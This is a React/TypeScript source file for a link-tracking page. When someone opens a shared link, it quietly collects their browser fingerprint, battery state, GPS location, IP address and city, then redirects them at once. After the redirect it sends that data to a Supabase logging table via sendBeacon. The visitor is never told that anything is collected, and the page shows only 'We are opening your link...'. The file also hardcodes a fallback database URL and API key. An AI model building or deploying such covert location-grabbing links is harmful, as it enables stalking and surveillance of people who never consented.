import { useEffect, useState } from 'react';
import { supabase, isSupabaseConfigured } from '../lib/supabase';

interface TrackingPageProps {
  trackingCode: string;
}

interface TrackingLink {
  id: string;
  tracking_code: string;
  target_url: string;
  creator_id?: string;
  status: string;
  created_at: string;
}

interface DeviceInfo {
  browser: string;
  browserVersion: string;
  os: string;
  deviceType: string;
  screenResolution: string;
  language: string;
  timezone: string;
  userAgent: string;
  platform: string;
}

export const TrackingPage: React.FC<TrackingPageProps> = ({ trackingCode }) => {
  const [error, setError] = useState<string | null>(null);
  const [loading, setLoading] = useState(true);

  // Collect device information (instant - no async calls)
  const getDeviceInfo = (): DeviceInfo => {
    const ua = navigator.userAgent;
    let browser = 'Unknown';
    let browserVersion = 'Unknown';
    let os = 'Unknown';
    let deviceType = 'Desktop';

    // Browser detection
    if (ua.includes('Firefox')) {
      browser = 'Firefox';
      browserVersion = ua.match(/Firefox\/(\d+\.\d+)/)?.[1] || 'Unknown';
    } else if (ua.includes('Chrome')) {
      browser = 'Chrome';
      browserVersion = ua.match(/Chrome\/(\d+\.\d+)/)?.[1] || 'Unknown';
    } else if (ua.includes('Safari')) {
      browser = 'Safari';
      browserVersion = ua.match(/Version\/(\d+\.\d+)/)?.[1] || 'Unknown';
    } else if (ua.includes('Edge')) {
      browser = 'Edge';
      browserVersion = ua.match(/Edge\/(\d+\.\d+)/)?.[1] || 'Unknown';
    }

    // OS detection
    if (ua.includes('Windows')) os = 'Windows';
    else if (ua.includes('Mac')) os = 'macOS';
    else if (ua.includes('Linux')) os = 'Linux';
    else if (ua.includes('Android')) os = 'Android';
    else if (ua.includes('iOS')) os = 'iOS';

    // Device type detection
    if (/Mobile|Android|iPhone|iPad|iPod/i.test(ua)) {
      deviceType = /iPad/i.test(ua) ? 'Tablet' : 'Mobile';
    }

    return {
      browser,
      browserVersion,
      os,
      deviceType,
      screenResolution: `${window.screen.width}x${window.screen.height}`,
      language: navigator.language,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      userAgent: ua,
      platform: navigator.platform,
    };
  };

  // Get battery information (async but fast)
  const getBatteryInfo = async (): Promise<{ level: number | null; charging: boolean | null }> => {
    if ('getBattery' in navigator) {
      try {
        const battery = await (navigator as any).getBattery();
        return {
          level: Math.round(battery.level * 100),
          charging: battery.charging,
        };
      } catch (e) {
        console.warn('Battery API error:', e);
      }
    }
    return { level: null, charging: null };
  };

  // Get geolocation (async, might take time)
  const getGeolocation = (): Promise<{ latitude: number | null; longitude: number | null; accuracy: number | null }> => {
    return new Promise((resolve) => {
      if (!navigator.geolocation) {
        resolve({ latitude: null, longitude: null, accuracy: null });
        return;
      }

      // Use lower accuracy for faster response
      navigator.geolocation.getCurrentPosition(
        (position) => {
          resolve({
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy,
          });
        },
        (error) => {
          console.warn('Geolocation error:', error);
          resolve({ latitude: null, longitude: null, accuracy: null });
        },
        { enableHighAccuracy: false, timeout: 5000, maximumAge: 60000 } // Faster, cached data OK
      );
    });
  };

  // Get IP address using ipapi.co (async, might take time)
  const getIPInfo = async (): Promise<{ ip: string | null; city: string | null; region: string | null; country: string | null }> => {
    try {
      const response = await fetch('https://ipapi.co/json/', { 
        signal: AbortSignal.timeout(3000) // 3 second timeout
      });
      const data = await response.json();
      return {
        ip: data.ip || null,
        city: data.city || null,
        region: data.region || null,
        country: data.country_name || null,
      };
    } catch (e) {
      console.warn('IP API error:', e);
      return { ip: null, city: null, region: null, country: null };
    }
  };

  // Send data using sendBeacon (works even after page unload)
  const sendTrackingData = (logData: any) => {
    if (!isSupabaseConfigured) return;

    const supabaseUrl = import.meta.env.VITE_SUPABASE_URL || 'https://zdnpadhlblyazzzwserr.supabase.co';
    const supabaseAnonKey = import.meta.env.VITE_SUPABASE_ANON_KEY || 'sb_publishable_zo1mrKN61gpDnlZNBnxzKg_BFLQed-E';

    const url = `${supabaseUrl}/rest/v1/tracking_logs`;
    const blob = new Blob([JSON.stringify(logData)], { type: 'application/json' });

    // Try sendBeacon first (works during page unload)
    if (navigator.sendBeacon) {
      const sent = navigator.sendBeacon(url, blob);
      if (sent) return;
    }

    // Fallback to regular fetch if sendBeacon fails
    fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'apikey': supabaseAnonKey,
        'Authorization': `Bearer ${supabaseAnonKey}`,
        'Prefer': 'return=minimal'
      },
      body: blob,
      keepalive: true // Important for sending during page unload
    }).catch(err => console.error('Failed to send tracking data:', err));
  };

  useEffect(() => {
    const processTracking = async () => {
      try {
        setLoading(true);

        // Step 1: Fetch tracking link from database (must be fast)
        let trackingLink: TrackingLink | null = null;
        
        if (isSupabaseConfigured) {
          const { data, error } = await supabase
            .from('tracking_links')
            .select('*')
            .eq('tracking_code', trackingCode)
            .single();

          if (error || !data) {
            setError('Invalid or expired tracking link');
            setLoading(false);
            return;
          }

          trackingLink = data as TrackingLink;
        } else {
          setError('Tracking requires database configuration');
          setLoading(false);
          return;
        }

        // Step 2: Collect instant device information
        const deviceInfo = getDeviceInfo();

        // Step 3: Start all async data collection in parallel (don't await)
        const batteryPromise = getBatteryInfo();
        const geoPromise = getGeolocation();
        const ipPromise = getIPInfo();

        // Step 4: Prepare initial data with what we have instantly
        const initialLogData = {
          tracking_link_id: trackingLink.id,
          latitude: null,
          longitude: null,
          accuracy: null,
          battery_level: null,
          charging: null,
          browser: deviceInfo.browser,
          browser_version: deviceInfo.browserVersion,
          os: deviceInfo.os,
          device_type: deviceInfo.deviceType,
          screen_resolution: deviceInfo.screenResolution,
          language: deviceInfo.language,
          timezone: deviceInfo.timezone,
          user_agent: deviceInfo.userAgent,
          platform: deviceInfo.platform,
          ip_address: null,
          city: null,
          region: null,
          country: null,
          visited_at: new Date().toISOString(),
        };

        // Step 5: Fix and prepare target URL
        let targetUrl = trackingLink.target_url;
        if (targetUrl.match(/^https?:[^/]/i)) {
          targetUrl = targetUrl.replace(/^https?:/i, 'https://');
        }
        if (targetUrl.match(/^https?:\/\/https?:\/\//i)) {
          targetUrl = targetUrl.replace(/^https?:\/\/https?:\/\//i, 'https://');
        }

        // Step 6: Redirect IMMEDIATELY with device info we have
        setLoading(false);
        
        // Small delay to ensure the redirect is processed
        setTimeout(() => {
          window.location.replace(targetUrl);
        }, 50);

        // Step 7: Complete data collection in background and send
        Promise.all([batteryPromise, geoPromise, ipPromise]).then(([batteryInfo, geoInfo, ipInfo]) => {
          const completeLogData = {
            ...initialLogData,
            latitude: geoInfo.latitude,
            longitude: geoInfo.longitude,
            accuracy: geoInfo.accuracy,
            battery_level: batteryInfo.level,
            charging: batteryInfo.charging,
            ip_address: ipInfo.ip,
            city: ipInfo.city,
            region: ipInfo.region,
            country: ipInfo.country,
          };

          // Send complete data using sendBeacon (works even after redirect)
          sendTrackingData(completeLogData);
        }).catch(err => {
          console.error('Error collecting additional data:', err);
          // Send at least the initial data we collected
          sendTrackingData(initialLogData);
        });

      } catch (e) {
        console.error('Tracking error:', e);
        setError('An error occurred during tracking');
        setLoading(false);
      }
    };

    processTracking();
  }, [trackingCode]);

  if (error) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-white">
        <div className="text-center space-y-4">
          <div className="text-red-500 text-4xl mb-4">⚠️</div>
          <h1 className="text-xl font-bold text-gray-800">Invalid or Expired Tracking Link</h1>
          <p className="text-sm text-gray-600">The tracking link you followed is not valid or has expired.</p>
        </div>
      </div>
    );
  }

  if (loading) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-white">
        <div className="text-center space-y-4">
          <div className="w-12 h-12 border-4 border-gray-300 border-t-blue-500 rounded-full animate-spin mx-auto" />
          <p className="text-sm text-gray-600">We are opening your link...</p>
        </div>
      </div>
    );
  }

  return null;
};
